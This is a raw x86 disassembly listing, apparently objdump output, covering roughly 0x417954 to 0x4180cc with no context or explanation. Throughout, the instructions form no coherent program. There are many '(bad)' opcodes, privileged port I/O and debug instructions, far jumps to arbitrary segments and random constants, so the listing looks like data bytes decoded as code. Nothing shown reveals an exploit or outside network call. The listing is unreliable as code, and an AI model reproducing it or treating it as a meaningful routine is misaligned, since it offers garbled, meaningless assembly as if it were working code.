  417954:	mov    ds:0x82c31535,eax
  417959:	jbe    0x41797b
  41795b:	pop    es
  41795c:	imul   BYTE PTR [ebx-0x28701b1c]
  417962:	call   0x9712:0x4e7376ba
  417969:	nop
  41796a:	jge    0x417976
  41796c:	jo     0x417966
  41796e:	mov    ebp,0x69efd9e7
  417973:	cld    
  417974:	inc    esi
  417975:	gs out dx,al
  417977:	sbb    esi,DWORD PTR [ebp-0x4bc5c70c]
  41797d:	test   al,0xf9
  41797f:	adc    al,0x33
  417981:	scas   eax,DWORD PTR es:[edi]
  417982:	(bad)  
  417983:	icebp  
  417984:	scas   al,BYTE PTR es:[edi]
  417985:	in     eax,dx
  417986:	inc    eax
  417987:	pop    esp
  417988:	xchg   DWORD PTR [ebx+ebp*4],ebp
  41798b:	lock dec edx
  41798d:	cmp    BYTE PTR [eax],al
  41798f:	ja     0x4179fd
  417991:	neg    BYTE PTR [eax+0x702d8290]
  417997:	sub    BYTE PTR [edx],dl
  417999:	cmc    
  41799a:	jecxz  0x417a0a
  41799c:	(bad)  
  41799d:	shl    edi,1
  41799f:	jl     0x41792e
  4179a1:	mov    eax,0xf60f00a3
  4179a6:	add    DWORD PTR [edx],ebx
  4179a8:	inc    eax
  4179a9:	out    dx,al
  4179aa:	int3   
  4179ab:	test   DWORD PTR [edx],edi
  4179ad:	sahf   
  4179ae:	lods   eax,DWORD PTR ds:[esi]
  4179af:	ja     0x417975
  4179b1:	or     DWORD PTR [ebp-0x556d0e2f],edx
  4179b7:	bound  edi,QWORD PTR [ebx+0x49]
  4179ba:	fs mov edx,0x983e54c1
  4179c0:	lds    eax,FWORD PTR [edi+0x72]
  4179c3:	iret   
  4179c4:	mov    DWORD PTR [esi],ecx
  4179c6:	jge    0x417970
  4179c8:	cmc    
  4179c9:	(bad)  
  4179ca:	fisubr DWORD PTR ds:0x3eba8459
  4179d0:	shr    DWORD PTR [ebx],1
  4179d2:	es adc al,0xf6
  4179d5:	js     0x41796b
  4179d7:	ret    0x2804
  4179da:	push   es
  4179db:	pop    edi
  4179dc:	(bad)  
  4179dd:	xlat   BYTE PTR ds:[ebx]
  4179de:	dec    ecx
  4179df:	cmp    DWORD PTR [ebp-0x7e87bb1b],esp
  4179e5:	and    DWORD PTR [eax-0x5f],0xffffffed
  4179e9:	dec    esi
  4179ea:	rcl    DWORD PTR [ecx+0x76],1
  4179ed:	shl    cl,0x87
  4179f0:	(bad)  
  4179f1:	mov    eax,0x8e17d7a6
  4179f6:	pop    ebp
  4179f7:	fmul   st,st(0)
  4179f9:	xchg   esp,eax
  4179fa:	pop    ebx
  4179fb:	xlat   BYTE PTR ds:[ebx]
  4179fc:	not    DWORD PTR ds:0x8919497b
  417a02:	mov    dh,0x57
  417a04:	adc    DWORD PTR [ecx-0x5e],edi
  417a07:	adc    ah,BYTE PTR [eax+0x1e]
  417a0a:	or     dh,al
  417a0c:	add    edi,esp
  417a0e:	ss push eax
  417a10:	mov    al,0x46
  417a12:	sub    al,bl
  417a14:	and    al,bl
  417a16:	shl    edx,0xb6
  417a19:	or     ebp,DWORD PTR [edx+0x1e3a3f73]
  417a1f:	or     eax,ebx
  417a21:	and    al,0xa7
  417a23:	adc    DWORD PTR [ecx-0xa7625e7],eax
  417a29:	lea    ebx,[esi+ebp*4-0x19]
  417a2d:	push   ds
  417a2e:	int3   
  417a2f:	mov    BYTE PTR [esi+0x58a285db],dh
  417a35:	dec    eax
  417a36:	pop    esi
  417a37:	mov    edx,0x491d76b4
  417a3c:	xlat   BYTE PTR ds:[ebx]
  417a3d:	xor    edi,DWORD PTR [ebp+0x4f]
  417a40:	xchg   esp,eax
  417a41:	mov    eax,0x5cce662d
  417a46:	add    edx,DWORD PTR [edi+0x456c87b3]
  417a4c:	jl     0x417a4a
  417a4e:	lea    ebp,[esi-0x1c2a89ab]
  417a54:	pushf  
  417a55:	(bad)  
  417a56:	int    0x4
  417a58:	lods   eax,DWORD PTR ds:[esi]
  417a59:	adc    BYTE PTR [eax],ah
  417a5b:	jp     0x417a3f
  417a5d:	jge    0x417ada
  417a5f:	nop
  417a60:	mov    esp,0x3f8c0906
  417a65:	sbb    edi,edi
  417a67:	push   esi
  417a68:	xchg   ebx,eax
  417a69:	shl    DWORD PTR [ebx],0xb1
  417a6c:	mov    ebp,0xd1c40743
  417a71:	mov    dh,0xaf
  417a73:	jl     0x417ac3
  417a75:	xor    ebp,DWORD PTR [ebp-0x19]
  417a78:	sub    DWORD PTR [ebx-0xfbfbe75],esi
  417a7e:	mov    BYTE PTR [esi+0x25],cl
  417a81:	cs jbe 0x417ad9
  417a84:	ins    DWORD PTR es:[edi],dx
  417a85:	jo     0x417a62
  417a87:	rcr    DWORD PTR [ebx-0x6e3d2f10],0xb0
  417a8e:	out    0x38,eax
  417a90:	and    DWORD PTR [ebp-0x63],ebp
  417a93:	xor    BYTE PTR [eax+0x1c],0x17
  417a97:	pop    esp
  417a98:	fwait
  417a99:	ret    
  417a9a:	(bad)  
  417a9b:	xchg   ebp,eax
  417a9c:	mov    bl,0xd
  417a9e:	outs   dx,DWORD PTR ds:[esi]
  417a9f:	pop    ebx
  417aa0:	push   ebx
  417aa1:	fbld   TBYTE PTR [ecx]
  417aa3:	and    al,0x29
  417aa5:	nop    DWORD PTR [eax]
  417aa8:	pop    ecx
  417aa9:	ins    DWORD PTR es:[edi],dx
  417aaa:	inc    esi
  417aab:	outs   dx,DWORD PTR ds:[esi]
  417aac:	popf   
  417aad:	aaa    
  417aae:	jne    0x417ac3
  417ab0:	pop    esi
  417ab1:	mov    ebp,0x7511184b
  417ab6:	jb     0x417aff
  417ab8:	dec    ebp
  417ab9:	int    0xe2
  417abb:	push   ss
  417abc:	call   0x7cf25f1c
  417ac1:	pushf  
  417ac2:	pop    eax
  417ac3:	sbb    al,0x74
  417ac5:	pop    esi
  417ac6:	push   cs
  417ac7:	(bad)  
  417ac8:	add    DWORD PTR [ebx],0x4
  417acb:	sbb    DWORD PTR [esi],ebx
  417acd:	(bad)  
  417ace:	pop    esp
  417acf:	nop
  417ad0:	xor    eax,0xd2397724
  417ad5:	fisubr DWORD PTR [esi+0x7dd8cab5]
  417adb:	mov    al,bh
  417add:	xor    BYTE PTR [edi-0x2c],0xd3
  417ae1:	sub    ch,BYTE PTR [esp+ecx*8-0x2844dcdc]
  417ae8:	std    
  417ae9:	jp     0x417abc
  417aeb:	arpl   WORD PTR ds:0xaa844b94,dx
  417af1:	cmp    DWORD PTR [esi+eiz*2],edx
  417af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417af5:	and    eax,0xee5a0e28
  417afa:	out    0x3c,al
  417afc:	aam    0x27
  417afe:	int    0x12
  417b00:	fcomp  QWORD PTR ds:0xf51d363d
  417b06:	xor    ebp,0x40bba671
  417b0c:	ror    DWORD PTR [edx],1
  417b0e:	mov    BYTE PTR [ebx+esi*4],0xcc
  417b12:	xchg   esi,eax
  417b13:	retf   0x6ffc
  417b16:	mov    ?,WORD PTR [eax+0x2a07f7db]
  417b1c:	jecxz  0x417adb
  417b1e:	ds popa 
  417b20:	fldenv [edi-0x43]
  417b23:	inc    ebx
  417b24:	lock iret 
  417b26:	pop    ebx
  417b27:	into   
  417b28:	dec    ebx
  417b29:	fcmovu st,st(5)
  417b2b:	jb     0x417acc
  417b2d:	gs dec edx
  417b2f:	and    al,bl
  417b31:	fstp   DWORD PTR [esi]
  417b33:	(bad)  
  417b34:	outs   dx,DWORD PTR ds:[esi]
  417b35:	sar    BYTE PTR [edi+0x69c3b754],0x15
  417b3c:	dec    edi
  417b3d:	inc    edi
  417b3e:	xor    dh,BYTE PTR [edi-0x1b87f856]
  417b44:	xchg   ebx,eax
  417b45:	mov    eax,0x58b0b3f
  417b4a:	add    DWORD PTR [ecx],0x45
  417b4d:	fs sub al,0x8
  417b50:	adc    eax,0x5ddfa71
  417b55:	inc    edx
  417b56:	aad    0xfe
  417b58:	inc    eax
  417b59:	std    
  417b5a:	mov    ch,0x7a
  417b5c:	cmp    BYTE PTR [edx],ch
  417b5e:	or     BYTE PTR [edx-0x111b7e42],0xf3
  417b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b66:	jle    0x417b09
  417b68:	jge    0x417b9e
  417b6a:	xchg   BYTE PTR [edx-0x17],dh
  417b6d:	push   ebp
  417b6e:	inc    edi
  417b6f:	repnz in al,0x15
  417b72:	(bad)  
  417b73:	arpl   WORD PTR ds:0xd5963c21,ax
  417b79:	call   eax
  417b7b:	retf   
  417b7c:	imul   ebp,DWORD PTR [edx-0x64],0x669c9f81
  417b83:	int3   
  417b84:	xchg   esp,eax
  417b85:	inc    esi
  417b86:	dec    esi
  417b87:	mov    al,ds:0xa5a80cdb
  417b8c:	add    BYTE PTR [esi+0x4112bca3],0x57
  417b93:	push   ecx
  417b94:	push   es
  417b95:	and    al,0xf1
  417b97:	js     0x417bf6
  417b99:	arpl   di,bx
  417b9b:	add    esp,DWORD PTR [esi+0x37]
  417b9e:	popa   
  417b9f:	mov    ah,BYTE PTR [edi]
  417ba1:	outs   dx,BYTE PTR ds:[esi]
  417ba2:	lods   al,BYTE PTR ds:[esi]
  417ba3:	xchg   ebx,eax
  417ba4:	sub    eax,0xf5985149
  417ba9:	inc    esi
  417baa:	pop    ecx
  417bab:	hlt    
  417bac:	lahf   
  417bad:	cld    
  417bae:	pop    edx
  417baf:	lods   al,BYTE PTR ds:[esi]
  417bb0:	mov    bl,0xad
  417bb2:	shr    DWORD PTR [ebp-0x58],0x86
  417bb6:	mov    ss,WORD PTR [ecx]
  417bb8:	mov    ds:0x80144b1d,al
  417bbd:	cmc    
  417bbe:	int3   
  417bbf:	mov    ebp,edx
  417bc1:	push   ebp
  417bc2:	and    al,0xee
  417bc4:	les    eax,FWORD PTR [esi-0x5c7a238a]
  417bca:	rcl    BYTE PTR [esp+edi*2+0x47],cl
  417bce:	xchg   esi,eax
  417bcf:	aas    
  417bd0:	lods   eax,DWORD PTR ds:[esi]
  417bd1:	cmp    dl,ch
  417bd3:	jae    0x417bfe
  417bd5:	(bad)  
  417bd6:	cmp    cl,ah
  417bd8:	cmp    al,0xb3
  417bda:	sti    
  417bdb:	inc    ebx
  417bdc:	clc    
  417bdd:	rcl    DWORD PTR [esi-0x4dc84fdc],cl
  417be3:	sub    al,0x9a
  417be5:	mov    ch,0x63
  417be7:	jecxz  0x417c5c
  417be9:	jmp    0x417be4
  417beb:	stos   BYTE PTR es:[edi],al
  417bec:	outs   dx,BYTE PTR ds:[esi]
  417bed:	dec    ebp
  417bee:	pop    ss
  417bef:	imul   ebp,DWORD PTR [ebx],0x971c35b4
  417bf5:	hlt    
  417bf6:	and    DWORD PTR [eax-0x4b3c9135],0xfffffff1
  417bfd:	cmp    ebp,DWORD PTR [edi+0x7c7aa147]
  417c03:	sbb    DWORD PTR [esi+eax*2-0x3e],edx
  417c07:	dec    ebx
  417c08:	inc    esi
  417c09:	into   
  417c0a:	and    bl,dl
  417c0c:	(bad)  
  417c0e:	sub    al,0x1e
  417c10:	mov    WORD PTR [edx],fs
  417c12:	push   ss
  417c13:	push   edx
  417c14:	cmp    eax,0x7de442bb
  417c19:	push   0xffffff8b
  417c1b:	sbb    dh,BYTE PTR [edx+0x20]
  417c1e:	dec    eax
  417c1f:	call   DWORD PTR [ebp+0x36bcd110]
  417c25:	cmp    al,0x4e
  417c27:	imul   esi,DWORD PTR [edi-0x12d8266],0xffffffd1
  417c2e:	add    esp,DWORD PTR [ecx+ebx*4]
  417c31:	or     BYTE PTR [ecx],bl
  417c33:	std    
  417c34:	dec    edx
  417c35:	pop    esp
  417c36:	dec    ebx
  417c37:	(bad)  
  417c38:	scas   eax,DWORD PTR es:[edi]
  417c39:	push   esp
  417c3a:	mov    fs,WORD PTR [esi]
  417c3c:	rcr    BYTE PTR [eax+ebp*2],cl
  417c3f:	inc    ecx
  417c40:	dec    esp
  417c41:	std    
  417c42:	cmc    
  417c43:	loop   0x417bfe
  417c45:	stc    
  417c46:	adc    al,0x1
  417c48:	push   ecx
  417c49:	aaa    
  417c4a:	icebp  
  417c4b:	or     DWORD PTR [esi],ecx
  417c4d:	es hlt 
  417c4f:	cmp    DWORD PTR [esi],edx
  417c51:	sbb    ecx,0x7e0de621
  417c57:	push   eax
  417c58:	popa   
  417c59:	mov    al,ds:0xdc98b50
  417c5e:	in     eax,0xab
  417c60:	cli    
  417c61:	pop    eax
  417c62:	ins    DWORD PTR es:[edi],dx
  417c63:	enter  0xbf98,0xcb
  417c67:	add    edx,ebx
  417c69:	shl    ah,cl
  417c6b:	jno    0x417bf6
  417c6d:	scas   eax,DWORD PTR es:[edi]
  417c6e:	pop    eax
  417c6f:	je     0x417cc7
  417c71:	lock push ebp
  417c73:	pop    ebx
  417c74:	jg     0x417c68
  417c76:	sbb    BYTE PTR [eax],dl
  417c78:	jp     0x417c91
  417c7a:	mov    BYTE PTR [ebp+0x3ea350f7],dl
  417c80:	sar    DWORD PTR [ecx+edi*4-0x71408b46],1
  417c87:	gs cld 
  417c89:	xchg   ebx,eax
  417c8a:	and    BYTE PTR [ecx-0x40],ch
  417c8d:	das    
  417c8e:	mov    cl,BYTE PTR [esi-0x767e8a36]
  417c94:	aam    0x3
  417c96:	inc    ebp
  417c97:	in     eax,0x40
  417c99:	test   DWORD PTR [edx],edi
  417c9b:	and    DWORD PTR [eax+0x4c],edx
  417c9e:	cmp    DWORD PTR [eax],edx
  417ca0:	pop    edi
  417ca1:	and    al,0x8d
  417ca3:	fs aam 0x81
  417ca6:	jecxz  0x417ca7
  417ca8:	jno    0x417ca9
  417caa:	jne    0x417c42
  417cac:	mov    ?,WORD PTR ds:0x478eedfc
  417cb2:	sub    al,0xd0
  417cb4:	outs   dx,BYTE PTR ds:[esi]
  417cb5:	mov    eax,0x55fea042
  417cba:	pop    edi
  417cbb:	pop    esp
  417cbc:	retf   0x89a6
  417cbf:	xchg   edi,eax
  417cc0:	lahf   
  417cc1:	stos   BYTE PTR es:[edi],al
  417cc2:	lods   al,BYTE PTR ds:[si]
  417cc4:	std    
  417cc5:	inc    esi
  417cc6:	out    dx,eax
  417cc7:	xchg   ebx,eax
  417cc8:	loope  0x417cd8
  417cca:	jbe    0x417c4e
  417ccc:	mov    DWORD PTR [edx],esp
  417cce:	xchg   esi,eax
  417ccf:	shl    BYTE PTR ds:0x1bb689e8,0x4b
  417cd6:	aaa    
  417cd7:	or     eax,0xd10ef033
  417cdc:	retf   
  417cdd:	push   cs
  417cde:	push   0xcc006bea
  417ce3:	les    ebp,FWORD PTR [esi]
  417ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ce6:	adc    edi,ebx
  417ce8:	or     eax,0x9fec25be
  417ced:	sbb    dl,BYTE PTR [edx]
  417cef:	sub    DWORD PTR [edi-0x51e50c53],0xa7618002
  417cf9:	push   cs
  417cfa:	sti    
  417cfb:	les    edi,FWORD PTR [ecx]
  417cfd:	add    al,0x9b
  417cff:	out    dx,eax
  417d00:	(bad)  
  417d01:	jno    0x417d24
  417d03:	adc    al,0x37
  417d05:	ins    BYTE PTR es:[edi],dx
  417d06:	cmp    al,0x2
  417d08:	xor    ecx,edx
  417d0a:	inc    edi
  417d0b:	shl    DWORD PTR ds:0xebf8c26f,1
  417d11:	leave  
  417d12:	iret   
  417d13:	xor    BYTE PTR [esp+ecx*1-0x6518aa3f],0xbf
  417d1b:	xchg   ah,al
  417d1d:	sahf   
  417d1e:	cmp    al,al
  417d20:	pop    es
  417d21:	ins    BYTE PTR es:[edi],dx
  417d22:	xchg   DWORD PTR [eax],ebx
  417d24:	arpl   WORD PTR [ebp-0x3a],dx
  417d27:	test   DWORD PTR [esi],ecx
  417d29:	shr    DWORD PTR [eax-0x68],1
  417d2c:	push   cs
  417d2d:	xchg   ebx,eax
  417d2e:	(bad)  
  417d2f:	lahf   
  417d30:	gs cld 
  417d32:	ja     0x417d20
  417d34:	pusha  
  417d35:	loope  0x417cbe
  417d37:	stos   DWORD PTR es:[edi],eax
  417d38:	mov    DWORD PTR [ecx],0xbb932822
  417d3e:	(bad)  
  417d40:	cmc    
  417d41:	ret    0xabdd
  417d44:	push   esi
  417d45:	push   esi
  417d46:	mov    ecx,0xcd8adff7
  417d4b:	test   DWORD PTR [esi+0x65],0xa5f8d21f
  417d52:	or     DWORD PTR [ecx-0x9],ebx
  417d55:	ja     0x417d89
  417d57:	xchg   ecx,eax
  417d58:	cwde   
  417d59:	sbb    al,dh
  417d5b:	cmp    esi,0xdc58cb38
  417d61:	(bad)  
  417d62:	daa    
  417d63:	cmp    BYTE PTR [eax],dh
  417d65:	daa    
  417d66:	xchg   esp,eax
  417d67:	imul   DWORD PTR [ebx+ebx*2+0x48b46e38]
  417d6e:	inc    edx
  417d6f:	pushf  
  417d70:	stos   BYTE PTR es:[edi],al
  417d71:	daa    
  417d72:	or     eax,0xcc9e5b3f
  417d77:	scas   al,BYTE PTR es:[edi]
  417d78:	daa    
  417d79:	ja     0x417dea
  417d7b:	and    BYTE PTR [esi],cl
  417d7d:	imul   ebx,DWORD PTR [ebx-0x5c088e43],0x28badb4
  417d87:	add    al,0xaa
  417d89:	nop
  417d8a:	inc    esp
  417d8b:	mov    edx,0x5078e0ee
  417d90:	jbe    0x417d68
  417d92:	out    0x3c,al
  417d94:	jno    0x417d5d
  417d96:	push   ds
  417d97:	lea    edx,[ecx-0x53]
  417d9a:	mov    edx,0x27f96ff2
  417d9f:	sub    ah,bl
  417da1:	jmp    0xaffa:0xbf79a70
  417da8:	adc    al,BYTE PTR [edx]
  417daa:	sbb    al,0x4e
  417dac:	dec    eax
  417dad:	stos   DWORD PTR es:[edi],eax
  417dae:	outs   dx,DWORD PTR gs:[esi]
  417db0:	push   DWORD PTR [edi]
  417db2:	mov    ds:0xf8ba1ee4,eax
  417db7:	cmp    edi,ebp
  417db9:	aam    0x34
  417dbb:	pop    edi
  417dbc:	dec    ebx
  417dbd:	jmp    0x1a5c:0xfa095d45
  417dc4:	(bad)  
  417dc5:	repz inc esp
  417dc7:	pop    ecx
  417dc8:	fadd   QWORD PTR [ecx-0x50]
  417dcb:	outs   dx,BYTE PTR ds:[esi]
  417dcc:	test   al,0xa0
  417dce:	hlt    
  417dcf:	repz and ah,cl
  417dd2:	jo     0x417d66
  417dd4:	or     ebp,DWORD PTR fs:[edx]
  417dd7:	pusha  
  417dd8:	mov    al,0x36
  417dda:	and    edx,ebx
  417ddc:	inc    ebx
  417ddd:	scas   al,BYTE PTR es:[edi]
  417dde:	cmp    BYTE PTR [edi-0x2f],0x48
  417de2:	daa    
  417de3:	data16 jns 0x417dd0
  417de6:	sub    DWORD PTR [esi+0x26],edx
  417de9:	in     eax,0x9c
  417deb:	not    DWORD PTR [edi+ebp*4]
  417dee:	mov    ds:0xed900d78,eax
  417df3:	loop   0x417e63
  417df5:	fstp   TBYTE PTR [esi+0x4f8c4e2b]
  417dfb:	stos   BYTE PTR es:[edi],al
  417dfc:	inc    edx
  417dfd:	test   DWORD PTR gs:[eax+0x71ba5039],ebp
  417e04:	dec    edi
  417e05:	out    dx,al
  417e06:	ret    0x68f3
  417e09:	mov    ds:0x992bb872,eax
  417e0e:	mov    DWORD PTR [esi-0x6d],edx
  417e11:	ss ja  0x417e81
  417e14:	dec    esi
  417e15:	(bad)  
  417e16:	push   eax
  417e17:	jbe    0x417e85
  417e19:	push   di
  417e1b:	test   ebp,edx
  417e1d:	cwde   
  417e1e:	and    DWORD PTR [edx],esi
  417e20:	std    
  417e21:	jns    0x417e4f
  417e23:	inc    edi
  417e24:	adc    BYTE PTR [eax+0x2d6b3f51],al
  417e2a:	pop    esp
  417e2b:	into   
  417e2c:	shl    BYTE PTR [edi],1
  417e2e:	outs   dx,DWORD PTR ds:[esi]
  417e2f:	nop
  417e30:	(bad)  
  417e31:	lahf   
  417e32:	sbb    al,0x4d
  417e34:	je     0x417e79
  417e36:	loope  0x417de4
  417e38:	aad    0x2
  417e3a:	test   DWORD PTR [esi],esp
  417e3c:	das    
  417e3d:	lahf   
  417e3e:	fstp   DWORD PTR [esi-0x7e]
  417e41:	idiv   BYTE PTR [ebx-0x271cfb57]
  417e47:	js     0x417e0e
  417e49:	aas    
  417e4a:	dec    ebp
  417e4b:	cs xchg ebp,eax
  417e4d:	stc    
  417e4e:	imul   edx,DWORD PTR [ebp+0xb],0xffffff87
  417e52:	mov    ah,0xdd
  417e54:	sbb    al,0xee
  417e56:	adc    ah,BYTE PTR [eax]
  417e58:	fiadd  WORD PTR [esi+0x73cbef2b]
  417e5e:	cmp    DWORD PTR [esi],0x62
  417e61:	and    eax,0x937bfed2
  417e66:	test   al,0x7d
  417e68:	or     DWORD PTR [ebp-0x28e3ffc0],eax
  417e6e:	int3   
  417e6f:	pop    ss
  417e70:	into   
  417e71:	hlt    
  417e72:	js     0x417e13
  417e74:	sub    cl,BYTE PTR [ebx+0x35]
  417e77:	jp     0x417e93
  417e79:	or     eax,0xff07d6b
  417e7e:	ins    BYTE PTR es:[edi],dx
  417e7f:	sub    eax,0x7919a323
  417e84:	add    ah,ch
  417e86:	pop    edi
  417e87:	push   ss
  417e88:	jne    0x417e93
  417e8a:	ja     0x417f00
  417e8c:	xor    ebx,DWORD PTR [bp+di]
  417e8f:	push   ebp
  417e90:	test   DWORD PTR [ecx],edi
  417e92:	cmp    BYTE PTR [eax+ecx*2+0xc6105df],bh
  417e99:	in     eax,dx
  417e9a:	and    esi,DWORD PTR [ebp+ebx*4+0x37]
  417e9e:	bound  ecx,QWORD PTR [esi]
  417ea0:	mov    ds:0xa3ebe503,eax
  417ea5:	add    DWORD PTR [edi-0x1a],edi
  417ea8:	jb     0x417edf
  417eaa:	xor    ecx,0x68136ad1
  417eb0:	jmp    0x417e9a
  417eb2:	(bad)  
  417eb3:	cld    
  417eb4:	sub    ebp,DWORD PTR [edi+0x40]
  417eb7:	sbb    DWORD PTR [eax-0x1d8cd52b],0x4e153d04
  417ec1:	into   
  417ec2:	xor    edx,0xffffffec
  417ec5:	adc    esp,0x0
  417ec8:	pushf  
  417ec9:	push   0x8428e8e1
  417ece:	mov    ebx,0x77e21dec
  417ed3:	jmp    0x417f04
  417ed5:	jmp    0x2558602c
  417eda:	fdiv   QWORD PTR ss:[esi+esi*8]
  417ede:	adc    dl,cl
  417ee0:	lock push esi
  417ee2:	fwait
  417ee3:	cmp    edx,DWORD PTR ds:0x179ae429
  417ee9:	push   0xffffff94
  417eeb:	xchg   edx,eax
  417eec:	xor    al,0x5a
  417eee:	(bad)  
  417eef:	jecxz  0x417f42
  417ef1:	sbb    eax,0xabc1100b
  417ef6:	cld    
  417ef7:	sti    
  417ef8:	outs   dx,DWORD PTR ds:[esi]
  417ef9:	sub    al,0xe5
  417efb:	and    esi,esp
  417efd:	sub    edi,eax
  417eff:	or     al,bl
  417f01:	data16 or BYTE PTR [ecx+0x7c2d0928],ch
  417f08:	cmp    BYTE PTR [eax-0x362ab860],0xb
  417f0f:	and    BYTE PTR [esi],al
  417f11:	scas   eax,DWORD PTR es:[edi]
  417f12:	and    DWORD PTR [edx-0x4d],ebx
  417f15:	fwait
  417f16:	retf   
  417f17:	shl    DWORD PTR [ebx+0x5f9228fc],1
  417f1d:	mov    ds:0x3997714,eax
  417f22:	sbb    cl,BYTE PTR [ebx+0x1aebc9da]
  417f28:	jbe    0x417eb3
  417f2a:	and    dh,cl
  417f2c:	cmc    
  417f2d:	inc    ebx
  417f2e:	lea    edx,[edi]
  417f30:	scas   al,BYTE PTR es:[edi]
  417f31:	je     0x417eb9
  417f33:	add    esi,eax
  417f35:	shl    DWORD PTR [esi+0x34c71787],cl
  417f3b:	or     eax,0xf8ff1b1a
  417f40:	and    ecx,DWORD PTR [ebx-0x44502ee8]
  417f46:	stos   DWORD PTR es:[edi],eax
  417f47:	jg     0x417f51
  417f49:	xchg   edi,eax
  417f4a:	fld    QWORD PTR [esi-0x29da83e6]
  417f50:	sbb    ebx,ebp
  417f52:	pop    es
  417f53:	push   eax
  417f54:	fwait
  417f55:	call   0x577e:0x2d3ed3e5
  417f5c:	test   eax,edi
  417f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f5f:	cmp    eax,0x12beb370
  417f64:	push   esi
  417f65:	inc    eax
  417f66:	out    dx,al
  417f67:	mov    edx,0x86d927d0
  417f6c:	and    edi,edx
  417f6e:	icebp  
  417f6f:	mov    ds,WORD PTR [ecx]
  417f71:	dec    esi
  417f72:	mov    ebp,0xeff55916
  417f77:	shl    BYTE PTR [edi-0x5fe75446],1
  417f7d:	ret    
  417f7e:	pop    es
  417f7f:	rcr    BYTE PTR [esi+0x87ecd9b],1
  417f85:	test   ebp,ecx
  417f87:	push   ds
  417f88:	mov    BYTE PTR [edi],cl
  417f8a:	sub    DWORD PTR [edi],edi
  417f8c:	jnp    0x417f62
  417f8e:	mov    dl,0xce
  417f90:	jle    0x417fe8
  417f92:	ss je  0x417f93
  417f95:	adc    eax,0x675868cd
  417f9a:	hlt    
  417f9b:	mov    al,ds:0x97624d7
  417fa0:	lahf   
  417fa1:	retf   
  417fa2:	(bad)  
  417fa3:	cs scas al,BYTE PTR es:[edi]
  417fa5:	sbb    BYTE PTR [ebx+0x13],cl
  417fa8:	push   edx
  417fa9:	arpl   WORD PTR [ebp+0x60627509],dx
  417faf:	int    0xb2
  417fb1:	xchg   DWORD PTR [eax+esi*4],ebp
  417fb4:	push   ecx
  417fb5:	jmp    0x2b3e:0x50be8f47
  417fbc:	int    0xd3
  417fbe:	xchg   ecx,eax
  417fbf:	push   esp
  417fc0:	stc    
  417fc1:	mov    ds:0xb9ef882c,al
  417fc6:	test   dl,0x28
  417fc9:	xor    DWORD PTR [ebx-0x7b8ffe53],0xfffffff6
  417fd0:	xchg   edx,eax
  417fd1:	inc    ecx
  417fd2:	xchg   ebx,eax
  417fd3:	xchg   esp,eax
  417fd4:	xchg   edi,eax
  417fd5:	cdq    
  417fd6:	add    eax,0x82b34250
  417fdb:	rol    ah,1
  417fdd:	mov    ds:0xf13ee988,al
  417fe2:	icebp  
  417fe3:	sar    BYTE PTR [esi-0x6e034e59],1
  417fe9:	out    dx,eax
  417fea:	rol    DWORD PTR [ebx+ecx*4+0x3b],0x44
  417fef:	out    0x35,eax
  417ff1:	and    ebx,esp
  417ff3:	aad    0x6d
  417ff5:	cld    
  417ff6:	icebp  
  417ff7:	push   ebx
  417ff8:	retf   0x4df0
  417ffb:	mov    esi,0x66db3f21
  418000:	xor    al,0x32
  418002:	inc    edi
  418003:	inc    ecx
  418004:	jmp    0x418003
  418006:	sub    BYTE PTR [eax+0x5a0fb59e],dh
  41800c:	jb     0x417fbd
  41800e:	add    ecx,DWORD PTR [esi+eiz*1+0x3f4aa8c7]
  418015:	jno    0x418042
  418017:	mov    BYTE PTR [ecx-0x47],0x79
  41801b:	pop    edx
  41801c:	dec    esi
  41801d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41801e:	and    al,0xf7
  418020:	ror    BYTE PTR [esi+0x326345af],cl
  418026:	(bad)  
  418027:	jl     0x418014
  418029:	sbb    BYTE PTR [eax],bh
  41802b:	std    
  41802c:	adc    ecx,edx
  41802e:	mov    dh,0x7d
  418030:	mov    WORD PTR [ecx+0x78f86a28],?
  418036:	cmp    al,0x33
  418038:	(bad)  [edx]
  41803a:	push   ebx
  41803b:	pop    ebx
  41803c:	adc    ebx,ebp
  41803e:	cmc    
  41803f:	(bad)  
  418041:	scas   al,BYTE PTR es:[edi]
  418042:	cld    
  418043:	out    dx,eax
  418044:	inc    edi
  418045:	scas   al,BYTE PTR es:[edi]
  418046:	pushf  
  418047:	mov    cl,0xa0
  418049:	sub    al,0x78
  41804b:	inc    ebx
  41804c:	mov    eax,ds:0xb82f37b5
  418051:	mov    ds:0x1210bc16,eax
  418056:	(bad)  
  418057:	out    0xe5,eax
  418059:	sar    edx,1
  41805b:	mov    ebx,0x3f63f835
  418060:	dec    edx
  418061:	add    al,0x25
  418063:	fdiv   DWORD PTR [edx+0x6feef500]
  418069:	xchg   esi,eax
  41806a:	mov    al,ds:0x76bccc0b
  41806f:	cmp    eax,0x63846cf9
  418074:	push   edx
  418075:	xor    al,0x3
  418077:	xor    dl,BYTE PTR [eax+0x10f2945d]
  41807d:	jnp    0x418006
  41807f:	and    eax,0xf6fbf903
  418084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418085:	aas    
  418086:	cld    
  418087:	mov    bh,0x27
  418089:	sbb    eax,DWORD PTR ds:0xacd185d1
  41808f:	sbb    BYTE PTR [ebx-0x7d],0xc0
  418093:	xor    al,0x4c
  418095:	sbb    al,0x2
  418097:	ins    DWORD PTR es:[edi],dx
  418098:	xchg   BYTE PTR [eax],dh
  41809a:	add    esp,DWORD PTR [esi+0x0]
  41809d:	vpmacsdql xmm4,xmm6,xmm0,XMMWORD PTR [ebp-0x6d]
  4180a4:	fstp   DWORD PTR [edx-0x3b]
  4180a7:	push   esp
  4180a8:	addr16 (bad) 
  4180ab:	xchg   ecx,eax
  4180ac:	cmp    ebp,eax
  4180ae:	pop    esp
  4180af:	push   ebp
  4180b0:	or     DWORD PTR [ecx+ebx*1],ecx
  4180b3:	aam    0xbf
  4180b5:	in     al,dx
  4180b6:	xor    BYTE PTR [ebx-0x30],dl
  4180b9:	clc    
  4180ba:	into   
  4180bb:	add    eax,0x2fd1f88
  4180c0:	gs adc al,0x3a
  4180c3:	out    dx,al
  4180c4:	scas   eax,DWORD PTR es:[edi]
  4180c5:	retf   
  4180c6:	aad    0x51
  4180c8:	out    0x6f,al
  4180ca:	pop    es
  4180cb:	pop    ss
  4180cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
